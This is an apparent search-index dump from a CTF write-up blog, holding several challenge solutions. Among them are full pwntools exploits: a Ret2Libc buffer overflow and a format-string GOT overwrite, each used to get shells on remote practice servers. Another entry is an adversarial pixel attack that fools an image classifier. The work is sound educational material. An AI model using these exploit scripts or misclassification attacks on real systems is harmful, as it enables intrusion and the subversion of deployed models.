#\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # # \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\" Welcome! The game is easy: you jump on a sPRiNG. How high will you fly? LEVEL (1/30) Guess the height: LEVEL (2/30) Guess the height: LEVEL (3/30) ... Guess the height: LEVEL (29/30) Guess the height: LEVEL (30/30) Guess the height: Congratulation! You've won! Here is your flag: picoCTF{pseudo_random_number_generator_not_so_random_5308efc8}  The code for the PRNG can be found here: prng.c.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/seed-spring/","section":"ctf","summary":"picoCTF 2019. 350 points. 32-bit binary. PRNG seed","time":4,"title":"seed-sPRiNG"},{"contents":"We are provided with a Python script that should print a flag, but it is not doing it:\nimport random import sys def str_xor(secret, key): # extend key to secret length new_key = key i = 0 while len(new_key) \u0026lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return \"\".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c, new_key_c) in zip(secret, new_key)]) flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + \\ chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + \\ chr(0x3a) + chr(0x0c) + chr(0x5d) + chr(0x5c) + chr(0x52) + \\ chr(0x42) + chr(0x50) + chr(0x5a) + chr(0x5d) + chr(0x14) def print_flag(): flag = str_xor(flag_enc, 'enkidu') print(flag) def print_encouragement(): encouragements = ['You can do it!', 'Keep it up!', 'Look how far you\\'ve come!'] choice = random.choice(range(0, len(encouragements))) print('\\n-----------------------------------------------------') print(encouragements[choice]) print('-----------------------------------------------------\\n\\n') def main(): print( ''' Y ··.-^-. / \\ .- ~ ~ -. () () / _ _ `. _ _ _ \\_ _/ /··/ \\ \\ . ~··_ _··~ . | | /··/ \\ \\ .' .~ ~-. `. | | /··/ ) ) /··/ `.`. \\ \\_ _/··/ / / /··/ `' \\_ _ _.' / / (··( / / \\··\\\\ / / \\··\\\\ / / )··) ( ( /··/ `.··`. .'··/ `. ~ - - - - ~ .' ~ . _ _ _ _ . ~ ''' ) print('Welcome to the serpentine encourager!\\n\\n') while True: print('a) Print encouragement') print('b) Print flag') print('c) Quit\\n') choice = input('What would you like to do? (a/b/c) ') if choice == 'a': print_encouragement() elif choice == 'b': print( '\\nOops! I must have misplaced the print_flag function! Check my source code!\\n\\n') elif choice == 'c': sys.exit(0) else: print('\\nI did not understand \"' + choice + '\", input only \"a\", \"b\" or \"c\"\\n\\n') if __name__ == \"__main__\": main()  The issue is that option \u0026ldquo;b\u0026rdquo; is not calling print_flag as it should:\n$ python3 serpentine.py Y .-^-. / \\ .- ~ ~ -. () () / _ _ `. _ _ _ \\_ _/ / / \\ \\ . ~ _ _ ~ . | | / / \\ \\ .' .~ ~-. `. | | / / ) ) / / `.`. \\ \\_ _/ / / / / / `' \\_ _ _.' / / ( ( / / \\ \\ / / \\ \\ / / ) ) ( ( / / `. `. .' / `. ~ - - - - ~ .' ~ . _ _ _ _ . ~ Welcome to the serpentine encourager! a) Print encouragement b) Print flag c) Quit What would you like to do? (a/b/c) b Oops! I must have misplaced the print_flag function! Check my source code! a) Print encouragement b) Print flag c) Quit What would you like to do? (a/b/c) c  One elegant way of calling it is importing the script from a Python interactive session, so that we can call the function directly (no reverse engineering needed):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from serpentine import print_flag \u0026gt;\u0026gt;\u0026gt; print_flag() picoCTF{7h3_r04d_l355_7r4v3l3d_b6567546}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/general-skills/serpentine/","section":"ctf","summary":"Beginner picoMini 2022. 100 points. Python script","time":3,"title":"Serpentine"},{"contents":"This challenge is the continuation of RIP my bof. Check it our first if you have not done it yet.\nNow, the flag is stored at /flag2.txt, so we must do something more than redirect the program execution to system(\u0026quot;cat /flag.txt\u0026quot;), as in RIP my bof.\nThe first thing I came up with was Ret2Libc. The idea is to obtain a shell by calling system inside Glibc with \u0026quot;/bin/sh\u0026quot; as argument.\nFor that purpose, we need to bypass ASLR, because Glibc is a system library and is affected by address randomization if ASLR is enabled (likely). This can be done leaking the address of a function inside Glibc during program execution. With this information, we are able to extract the last three hexadecimal digits and search for a certain Glibc version. Once we have it, we need to figure out the offset for system and the string \u0026quot;/bin/sh\u0026quot;. This will be explained later in more detail.\nThe binary is called server, and is a 32-bit binary with NX enabled. If we run it, we see the stack and the value of $eip (this was a helping hand for challenge RIP my bof). The input text is handled using gets, which is vulnerable to Buffer Overflow.\nTo perform a Ret2Libc, first we need an address of Glibc during program execution. This can be done calling puts and passing an address of a function in the Global Offset Table (GOT), so that the value of that address is printed in standard output (the value of an entry in the GOT is the real address of an external function, if it has been already looked up).\nIn order to call puts, we must point $eip to the entry of puts inside the Procedure Linkage Table (PLT), which contains instructions that perform a jump to the GOT or handles the address lookup if the GOT entry is empty.\nThe address of puts at the PLT can be obtained with objdump:\n$ objdump -d server | grep puts 08048410 \u0026lt;puts@plt\u0026gt;: 8048704: e8 07 fd ff ff call 8048410 \u0026lt;puts@plt\u0026gt; 8048716: e8 f5 fc ff ff call 8048410 \u0026lt;puts@plt\u0026gt; 8048846: e8 c5 fb ff ff call 8048410 \u0026lt;puts@plt\u0026gt; 8048881: e8 8a fb ff ff call 8048410 \u0026lt;puts@plt\u0026gt;  Then we need an address of the GOT, for example, the same puts function. Again with objdump or readelf:\n$ objdump -R server | grep puts 0804a018 R_386_JUMP_SLOT puts@GLIBC_2.0 $ readelf -r server | grep puts 0804a018 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0  Finally, we need to set a returning address. Since we will need to send another payload, we must run the program again but without closing the process. Hence, the return instruction must be the address of main:\n$ objdump -d server | grep main 08048430 \u0026lt;__libc_start_main@plt\u0026gt;: 804849d: e8 8e ff ff ff call 8048430 \u0026lt;__libc_start_main@plt\u0026gt; 08048640 \u0026lt;main\u0026gt;: $ readelf -s server | grep main 7: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2) 61: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_ 73: 08048640 90 FUNC GLOBAL DEFAULT 14 main  Now that we have those values, we can send the payload. It will be made of 60 bytes of junk (taken from RIP my bof), the address of puts at PLT, the return address (main) and the argument for puts (which is the address of puts at GOT).\nLet\u0026rsquo;s try it:\n$ python3 -c 'import os; os.write(1, b\"A\" * 60 + b\"\\x10\\x84\\x04\\x08\" + b\"\\x40\\x86\\x04\\x08\" + b\"\\x18\\xa0\\x04\\x08\")' | ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea27a0 | 00 00 00 00 00 00 00 00 | 0xffea27a8 | 00 00 00 00 00 00 00 00 | 0xffea27b0 | 00 00 00 00 00 00 00 00 | 0xffea27b8 | 00 00 00 00 00 00 00 00 | 0xffea27c0 | ff ff ff ff ff ff ff ff | 0xffea27c8 | ff ff ff ff ff ff ff ff | 0xffea27d0 | 80 75 f1 f7 00 a0 04 08 | 0xffea27d8 | e8 27 ea ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea27a0 | 41 41 41 41 41 41 41 41 | 0xffea27a8 | 41 41 41 41 41 41 41 41 | 0xffea27b0 | 41 41 41 41 41 41 41 41 | 0xffea27b8 | 41 41 41 41 41 41 41 41 | 0xffea27c0 | 41 41 41 41 41 41 41 41 | 0xffea27c8 | 41 41 41 41 41 41 41 41 | 0xffea27d0 | 41 41 41 41 41 41 41 41 | 0xffea27d8 | 41 41 41 41 10 84 04 08 | Return address: 0x08048410 0@ Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea2790 | 00 00 00 00 00 00 00 00 | 0xffea2798 | 00 00 00 00 00 00 00 00 | 0xffea27a0 | 00 00 00 00 00 00 00 00 | 0xffea27a8 | 00 00 00 00 00 00 00 00 | 0xffea27b0 | ff ff ff ff ff ff ff ff | 0xffea27b8 | ff ff ff ff ff ff ff ff | 0xffea27c0 | 80 75 f1 f7 00 a0 04 08 | 0xffea27c8 | d8 27 ea ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea2790 | 00 00 00 00 00 00 00 00 | 0xffea2798 | 00 00 00 00 00 00 00 00 | 0xffea27a0 | 00 00 00 00 00 00 00 00 | 0xffea27a8 | 00 00 00 00 00 00 00 00 | 0xffea27b0 | ff ff ff ff ff ff ff ff | 0xffea27b8 | ff ff ff ff ff ff ff ff | 0xffea27c0 | 80 75 f1 f7 00 a0 04 08 | 0xffea27c8 | d8 27 ea ff 8b 86 04 08 | Return address: 0x0804868b zsh: done python3 -c | zsh: segmentation fault (core dumped) ./server  Here we can see two things, main has been called twice, and the leak has been produced (the weird characters 0@\u0026gt; and other non-printable are the address of puts inside Glibc at runtime).\nNow we can create a Python exploit to extract the value of the leak and then search for a Glibc version that matches:\n#!/usr/bin/env python3 from pwn import * context.binary = 'server' elf = context.binary def main(): p = elf.process() main_addr = 0x8048640 puts_plt_addr = 0x8048410 puts_got_addr = 0x804a018 offset = 60 junk = b'A' * offset payload = junk payload += p32(puts_plt_addr) payload += p32(main_addr) payload += p32(puts_got_addr) p.sendlineafter(b'Input some text: ', payload) p.recvuntil(b'Return address') p.recvline() p.recvline() puts_addr = u32(p.recvline().strip()[:4]) log.info(f'Leaked puts() address: {hex(puts_addr)}') if __name__ == '__main__': main()  If we execute it, we have the address of puts at runtime:\n$ python3 solve.py [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './server': pid 1746785 [*] Leaked puts() address: 0xf7e3b290 [*] Switching to interactive mode Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xff94ee90 | 00 00 00 00 00 00 00 00 | 0xff94ee98 | 00 00 00 00 00 00 00 00 | 0xff94eea0 | 00 00 00 00 00 00 00 00 | 0xff94eea8 | 00 00 00 00 00 00 00 00 | 0xff94eeb0 | ff ff ff ff ff ff ff ff | 0xff94eeb8 | ff ff ff ff ff ff ff ff | 0xff94eec0 | 80 15 fb f7 00 a0 04 08 | 0xff94eec8 | d8 ee 94 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: $  The use of context.log_level = 'DEBUG' might be useful using pwntools because all data sent and received is shown as hexadecimal bytes.\nFor the moment, let\u0026rsquo;s finish the exploit locally. Now that we have the real address of puts and the program restarted at main, we have another chance to enter another payload. Moreover, now we can compute the base address of Glibc.\nASLR works so that only a base address is randomized, and then the function addresses are computed using offsets. We can get the offset for puts from our local Glibc:\n$ ldd server linux-gate.so.1 (0xf7f41000) libc.so.6 = /lib32/libc.so.6 (0xf7d3f000) /lib/ld-linux.so.2 (0xf7f43000) $ readelf -s /lib32/libc.so.6 | grep puts 215: 00071290 531 FUNC GLOBAL DEFAULT 16 _IO_puts@@GLIBC_2.0 461: 00071290 531 FUNC WEAK DEFAULT 16 puts@@GLIBC_2.0 540: 0010c050 1240 FUNC GLOBAL DEFAULT 16 putspent@@GLIBC_2.0 737: 0010dc90 742 FUNC GLOBAL DEFAULT 16 putsgent@@GLIBC_2.10 1244: 0006fa20 381 FUNC WEAK DEFAULT 16 fputs@@GLIBC_2.0 1831: 0006fa20 381 FUNC GLOBAL DEFAULT 16 _IO_fputs@@GLIBC_2.0 2507: 0007ac20 191 FUNC WEAK DEFAULT 16 fputs_unlocked@@GLIBC_2.1  The offset for puts is 0x71290. Notice that the last three digits of the offset match with the last three digits of the real address of puts at runtime. This happens because ASLR generates an address that ends in 000 in hexadecimal digits. This is also a sanity check that everything is working well.\nWe can compute the base address of Glibc at runtime with trivial arithmetic. Afterwards, we can obtain the real address of system and the pointer to \u0026quot;/bin/sh\u0026quot;. These are the offsets:\n$ readelf -s /lib32/libc.so.6 | grep system 258: 00137810 106 FUNC GLOBAL DEFAULT 16 svcerr_systemerr@@GLIBC_2.0 662: 00045420 63 FUNC GLOBAL DEFAULT 16 __libc_system@@GLIBC_PRIVATE 1534: 00045420 63 FUNC WEAK DEFAULT 16 system@@GLIBC_2.0 $ strings -atx /lib32/libc.so.6 | grep /bin/sh 18f352 /bin/sh  Now we can compute the real addresses and send the second payload, to call system with the pointer to \u0026quot;/bin/sh\u0026quot; as argument:\n#!/usr/bin/env python3 from pwn import * context.binary = 'server' elf = context.binary def main(): p = elf.process() main_addr = 0x8048640 puts_plt_addr = 0x8048410 puts_got_addr = 0x804a018 offset = 60 junk = b'A' * offset payload = junk payload += p32(puts_plt_addr) payload += p32(main_addr) payload += p32(puts_got_addr) p.sendlineafter(b'Input some text: ', payload) p.recvuntil(b'Return address') p.recvline() p.recvline() puts_addr = u32(p.recvline().strip()[:4]) log.info(f'Leaked puts() address: {hex(puts_addr)}') puts_offset = 0x071290 system_offset = 0x045420 bin_sh_offset = 0x18f352 glibc_base_addr = puts_addr - puts_offset log.info(f'Glibc base address: {hex(glibc_base_addr)}') system_addr = glibc_base_addr + system_offset bin_sh_addr = glibc_base_addr + bin_sh_offset payload = junk payload += p32(system_addr) payload += p32(0) payload += p32(bin_sh_addr) p.sendlineafter(b'Input some text: ', payload) p.recv() p.interactive() if __name__ == '__main__': main()  $ python3 solve.py [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './server': pid 1758891 [*] Leaked puts() address: 0xf7dd1290 [*] Glibc base address: 0xf7d60000 [*] Switching to interactive mode $ ls server solve.py  Nice, now we can use remote instead of process and run the exlpoit on the remote instance:\n$ python3 solve.py thekidofarcrania.com 4902 [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked puts() address: 0xf7e17b40 [*] Glibc base address: 0xf7da68b0 [*] Switching to interactive mode Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffe12f10 | 41 41 41 41 41 41 41 41 | 0xffe12f18 | 41 41 41 41 41 41 41 41 | 0xffe12f20 | 41 41 41 41 41 41 41 41 | 0xffe12f28 | 41 41 41 41 41 41 41 41 | 0xffe12f30 | 41 41 41 41 41 41 41 41 | 0xffe12f38 | 41 41 41 41 41 41 41 41 | 0xffe12f40 | 41 41 41 41 41 41 41 41 | 0xffe12f48 | 41 41 41 41 d0 bc de f7 | Return address: 0xf7debcd0 timeout: the monitored command dumped core [*] Got EOF while reading in interactive $  And it fails, this is because the server is using a different Glibc version. Notice that the last three hexadecimal digits of the address of puts are different than before, and thus the base address of Glibc does not end in 000.\nHowever, we can search for Glibc versions that have puts with an offset that ends in b40, which is the one used in the remote instance. One useful Glibc database is libc.blukat.me:\nHere we can download the file or take note of the offsets we need (puts, system and \u0026quot;/bin/sh\u0026quot;). We must update the offsets:\nputs_offset = 0x067b40 # 0x071290 system_offset = 0x03d200 # 0x045420 bin_sh_offset = 0x17e0cf # 0x18f352  Now we run the exploit again and we get a shell:\n$ python3 solve.py thekidofarcrania.com 4902 [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked puts() address: 0xf7d7db40 [*] Glibc base address: 0xf7d16000 [*] Switching to interactive mode $ cat /flag2.txt CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}  There is a simpler way to get a shell. Actually, the challenge says that there is no need to use Glibc. In fact, we can take advantage of the help that the program shows to exploit the Buffer Overflow vulnerability as in RIP my bof.\nThe key here is that the program is leaking stack addresses, so we can write there \u0026quot;/bin/sh\u0026quot; and have the value of an address that points to that string. Another thing is that system is directly callable from the program because it is in the PLT, as it is used within the code.\nTherefore, we only need to call system at PLT and add an address on the stack where we will store the string \u0026quot;/bin/sh\u0026quot;.\nWe are able to take an address of the stack from the program output, for example, the first one. The idea is to overwrite the $eip register with the address of system at PLT, then, the next 4 bytes will be the return address (null bytes, we do not care), and the next 4 bytes are the pointer to \u0026quot;/bin/sh\u0026quot;. The best idea is to enter \u0026quot;/bin/sh\u0026quot; right after the pointer and compute its address to put it in the right position.\nSome GDB testing might be useful to check that everything is where is supposed to be.\nHopefully, this comes clearer with the Python exploit, which is shorter than the previous one:\n#!/usr/bin/env python3 from pwn import context, log, p32, remote, sys context.binary = 'server' elf = context.binary def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def main(): p = get_process() p.recvuntil(b'address') p.recvline() stack_addr = int(p.recvline().split()[0].decode(), 16) log.info(f'Leaked an address on the stack: {hex(stack_addr)}') offset = 60 junk = b'A' * offset payload = junk payload += p32(elf.plt.system) payload += p32(0) payload += p32(stack_addr + 0x48) payload += b'/bin/sh' p.sendlineafter(b'Input some text: ', payload) p.recvuntil(b'Return') p.recv() p.interactive() if __name__ == '__main__': main()  And it works locally and remotely, without the use of Glibc:\n$ python3 solve2.py [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked an address on the stack: 0xff9bac40 [*] Switching to interactive mode $ ls server solve2.py solve.py  $ python3 solve2.py thekidofarcrania.com 4902 [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked an address on the stack: 0xffd57510 [*] Switching to interactive mode $ cat /flag2.txt CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}  The full exploit scripts can be found in here: solve.py and solve2.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/shell-time/","section":"ctf","summary":"32-bit binary. Buffer Overflow. Ret2Libc","time":12,"title":"Shell time!"},{"contents":"We are given this Python source code:\nimportstring importrandom flag=open(\"flag.txt\").read().strip() mystery_num=random.randint(100,1000) new_alphabet=list(string.ascii_lowercase+string.digits+string.punctuation) enc_flag=\"\" defshift(char): index=new_alphabet.index(char) new_index=(index+mystery_num) %len(new_alphabet) returnnew_alphabet[new_index] forcharinflag: enc_flag+=shift(char) mystery_num+=10 print(enc_flag) # 15[=\u0026gt;ts-!]kgjhz%6cn~\";=;.1b3:\u0026gt;}sq7n'\\^]42t  What the script does is set an alphabet and a random number (mystery_num). Then, to encrypt the flag, it finds the index of the current plaintext character in the alphabet, adds it to the random number (modulo the length of the alphabet) and returns the character at that new index.\nSince we know the format of flags (ictf{...}), we can find the value of random number modulo the length of the alphabet:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; import string \u0026gt;\u0026gt;\u0026gt; new_alphabet = list(string.ascii_lowercase + string.digits + string.punctuation) \u0026gt;\u0026gt;\u0026gt; enc_flag = '''15[=\u0026gt;ts-!]kgjhz%6cn~\";=;.1b3:\u0026gt;}sq7n'\\^]42t''' \u0026gt;\u0026gt;\u0026gt; index = new_alphabet.index('i') \u0026gt;\u0026gt;\u0026gt; new_index = new_alphabet.index(enc_flag[0]) \u0026gt;\u0026gt;\u0026gt; mystery_num = (new_index - index) % len(new_alphabet) \u0026gt;\u0026gt;\u0026gt; mystery_num 19  Notice that we don\u0026rsquo;t care if mystery_num is not the actual random value (which is between 100 and 1000), because it is applied modulo the length of the alphabet.\nNow we can define the inverse function of shift (unshift) and get the flag:\n\u0026gt;\u0026gt;\u0026gt; def unshift(char): ... new_index = new_alphabet.index(char) ... index = (new_index - mystery_num) % len(new_alphabet) ... return new_alphabet[index] ... \u0026gt;\u0026gt;\u0026gt; flag = '' \u0026gt;\u0026gt;\u0026gt; for char in enc_flag: ... flag += unshift(char) ... mystery_num += 10 ... \u0026gt;\u0026gt;\u0026gt; flag 'ictf{sh1ft1ng_ch@rs_w1th_4_myst3ry_numb3r}'  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/shifted/","section":"ctf","summary":"ImaginaryCTF 03/09/2022. 50 points. Modular arithmetic. Reverse encryption algorithm","time":2,"title":"Shifted"},{"contents":"We are given a 64-bit binary called vuln:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  If we use Ghidra to extract the decompiled C source code, we see the main function:\nundefined8 main() { longin_FS_OFFSET; charlocal_118[264]; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); setvbuf(stdout, (char*) 0x0, 2, 0); setvbuf(stdin, (char*) 0x0, 2, 0); puts(\"Send your string to be printed:\"); fgets(local_118, 256, stdin); printf(local_118); puts(\"As someone wise once said, `sh`\"); puts(\"(i think? not really sure about that one)\"); if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  This function has a Format String vulnerability because the variable named local_118 is controlled by us and it is passed as the first argument to printf. Hence, we can use format string specifiers to leak values from the stack and also write values into the addresses saved in the stack.\nThere is also a win function:\nvoidwin() { system(\"cat flag.txt \u0026gt;/dev/null\"); return; }  But it is useless because the output of cat flag.txt is redirected to /dev/null. However, we already have system linked to the binary, so we don\u0026rsquo;t have to bypass ASLR in order to call system.\nNotice also this weird message:\nputs(\"As someone wise once said, `sh`\");  Suppose that puts was system, then we will have a shell because \u0026quot;... `sh`\u0026quot; will execute sh. We can check it with a simple C program:\n$ cat test.c #include \u0026lt;stdlib.h\u0026gt; int main() { system(\"As someone wise once said, `sh`\"); return 0; } $ gcc test.c -o test $ ./test id whoami uname -a ^C $ ./test asdf sh: 1: asdf: not found ^C  However, notice that we don\u0026rsquo;t see any output, only errors. But this is enough for exploitation.\nThe strategy is to modify the Global Offset Table (GOT) and set puts to be system, so that we have a shell when executing system(\u0026quot;As someone wise once said, `sh`\u0026quot;). To exploit the Format String vulnerability, we can use fmtstr_payload from pwntools, which automates the process of writing bytes to a given address.\nFirst of all, we must determine the offset where our format string is placed in the stack:\n$ ./vuln Send your string to be printed: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. 7ffff7fa9a03.0.7ffff7ecafd2.7fffffffe610.0.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9800000000a.98000000980. As someone wise once said, `sh` (i think? not really sure about that one)  It is at position 6. We can verify it like this:\n$ ./vuln Send your string to be printed: AAAABBBB%6$lx AAAABBBB4242424241414141 As someone wise once said, `sh` (i think? not really sure about that one)  And as it can be seen, %6$lx was replaced by 4242424241414141 (which is AAAABBBB in hexadecimal format, little-endian). The Format String exploit will abuse the %n specifier to write values into an address placed in the stack. We can control the address because we know where in memory we can put an address and the position of this value in the stack. The way %n works is by writing the number of bytes printed until %n into the given address. And this is the way we can modify the GOT and set puts to be system.\nThe GOT is a nice point for exploitation because it contains the addresses of the external functions used by the binary or the addresses to perform the resolutions if they have not been called yet.\nSo this is the final exploit, really simple using pwntools:\n#!/usr/bin/env python3 frompwnimportcontext, ELF, fmtstr_payload, remote, sys context.binary=elf=ELF('vuln') defget_process(): iflen(sys.argv) ==1: returnelf.process() host, port=sys.argv[1], sys.argv[2] returnremote(host, int(port)) defmain(): p=get_process() payload=fmtstr_payload(6, {elf.got.puts: elf.sym.system}) p.sendlineafter(b'Send your string to be printed:\\n', payload) p.recv() p.interactive() if__name__=='__main__': main()  And we have a shell, but as before, we can\u0026rsquo;t read from stdout but from stderr, so a way to obtain the output is by using $(...):\n$ python3 solve.py [*] '/home/rocky/Desktop/ImaginaryCTF/Pwn/asdf/vuln' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/home/rocky/Desktop/ImaginaryCTF/Pwn/asdf/vuln': pid 1200265 [*] Switching to interactive mode $ $(whoami) sh: 1: rocky: not found  Now let\u0026rsquo;s get the flag from the remote instance:\n$ python3 solve.py got.ictf.kctf.cloud 1337 [*] '/home/rocky/Desktop/ImaginaryCTF/Pwn/asdf/vuln' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to got.ictf.kctf.cloud on port 1337: Done [*] Switching to interactive mode $ $(cat flag.txt) sh: 1: ictf{f0rmat_strings_are_so_cool_tysm_rythm_for_introducing_me}: not found  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/show-me-what-you-got/","section":"ctf","summary":"ImaginaryCTF 08/08/2022. 75 points. 64-bit binary. Format String vulnerability. GOT overwrite","time":4,"title":"show-me-what-you-got"},{"contents":"We are given a webpage where we can modify the color of five pixels from a dog image. We can choose the position of the pixels (x, y) and the color (RGB values) and the image has 32x32 pixels:\nThe robot classifies the image as some of these objects:\n airplane automobile bird cat deer dog frog horse ship truck  The classification is handled with a Machine Learning algorithm (using tensorflow). We are also given the model (sigmanet.h5) and the Python code to load the model and classify images (model.py).\nUnderstanding the attack The objective is to fool the robot\u0026rsquo;s Artificial Intelligence so that it misclassifies the dog\u0026rsquo;s image after the pixel modification. This is a kind of Adversarial Machine Learning, which is only adding noise to an image to cause a classification error on the model:\nFirst of all, we might want to use a Jupyter Notebook to work with the model. This time I used Google Colab. I entered the model.py code as a cell and then I imported the model and the dog image:\nimport imageio import numpy as np from matplotlib.pyplot import imshow img = imageio.imread('dog.png', pilmode='RGB') dog = np.array(img)  Proof of concept Messing around with the pixels, drawing crosses in red and white, we get the model to classify the images as a horse and a cat:\nHowever, if we try this values on the webpage, we don\u0026rsquo;t see the flag (although the AI misclassifies the image):\nThen I started thinking that we need to fool the AI so that it classifies with every available class, and continued working on the frog manually.\nManual approach The process was trying random positions and random colors. Then, I changed one value up and down and selected the one that gave more confidence (the value in the corresponding position of the list). When that value is the max value of all confidences, then the model says that the image is a frog. Eventually I got it, after a lot of trial and error:\nUnfortunately, the webpage didn\u0026rsquo;t show the flag either. Hence, I thought that maybe we need to make the robot classify an object that is not an animal. Namely, one of these:\n airplane automobile ship truck  The manual attempt is very time-consuming and not efficient. Hence, we can design some sort of algorithm to do something similar, but automatically.\nAutomatic approach The idea is to take a list of attempts, and generate some new attempts based on the previous ones (modifying randomly a single value for position or color). Then, we classify them using the model and sort them by confidence in the four objects we need. Finally, we take only the best ones and continue onto the next iteration until the confidence is the maximum of the list.\nThis is the Python code that implements this algorithm:\nfrom random import randint as ri NUM_WINNERS = 4 MAX_DISTANCE = 10 MAX_COLOR = 4 NUM_FIXES = 5 def generate(x, y, r, g, b): n = ri(0, 99) if 0 \u0026lt;= n \u0026lt; 10: x = max( 0, x - ri(1, MAX_DISTANCE)) if 10 \u0026lt;= n \u0026lt; 20: x = min( 31, x + ri(1, MAX_DISTANCE)) if 20 \u0026lt;= n \u0026lt; 30: y = max( 0, y - ri(1, MAX_DISTANCE)) if 30 \u0026lt;= n \u0026lt; 40: y = min( 31, y + ri(1, MAX_DISTANCE)) if 40 \u0026lt;= n \u0026lt; 50: r = max( 0, r - ri(1, MAX_COLOR)) if 50 \u0026lt;= n \u0026lt; 60: r = min(255, r + ri(1, MAX_COLOR)) if 60 \u0026lt;= n \u0026lt; 70: g = max( 0, g - ri(1, MAX_COLOR)) if 70 \u0026lt;= n \u0026lt; 80: g = min(255, g + ri(1, MAX_COLOR)) if 80 \u0026lt;= n \u0026lt; 90: b = max( 0, b - ri(1, MAX_COLOR)) if 90 \u0026lt;= n \u0026lt; 100: b = min(255, b + ri(1, MAX_COLOR)) return x, y, r, g, b def rand_pixel(): return ri(0, 31), ri(0, 31), ri(0, 255), ri(0, 255), ri(0, 255) attempts = [[rand_pixel() for __ in range(5)] for _ in range(NUM_WINNERS)] done = False while not done: new_attempts = attempts.copy() for i, attempt in enumerate(attempts): for _ in range(50): new_attempts.append([generate(*attempt[i]) for i in range(NUM_FIXES)]) max_confs = [] for i, attempt in enumerate(new_attempts): new_img = dog.copy() for x, y, r, g, b in attempt: new_img[x, y] = [r, g, b] pred, conf = sigmanet.predict_one(new_img)  max_conf = max(conf[0], conf[1], conf[8], conf[9]) max_confs.append((i, max_conf)) if pred in {'airplane', 'automobile', 'ship', 'truck'}: print(pred, attempt) done = True break max_confs.sort(key=lambda x: x[1], reverse=True) indeces = map(lambda x: x[0], max_confs[:NUM_WINNERS]) attempts = [new_attempts[i] for i in indeces] print(max_confs[:NUM_WINNERS])  This algorithm will always increase the confidence for the desired values (or at least, maintain the level). After some time, we get this output:\nThere are some values to classify as an airplane. We can test it locally:\nFlag Alright. Finally, if we try these values on the webpage, we will get the flag (HTB{0ne_tw0_thr33_f0ur_f1v3_p1xel_attack}):\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/sigma-technology/","section":"ctf","summary":"Adversarial Machine Learning","time":4,"title":"Sigma Technology"},{"contents":"We have the C source code of a binary and a remote instance to connect to. Basically, what the program does is call function gets, which is vulnerable to Buffer Overflow, and then compare a local variable with a 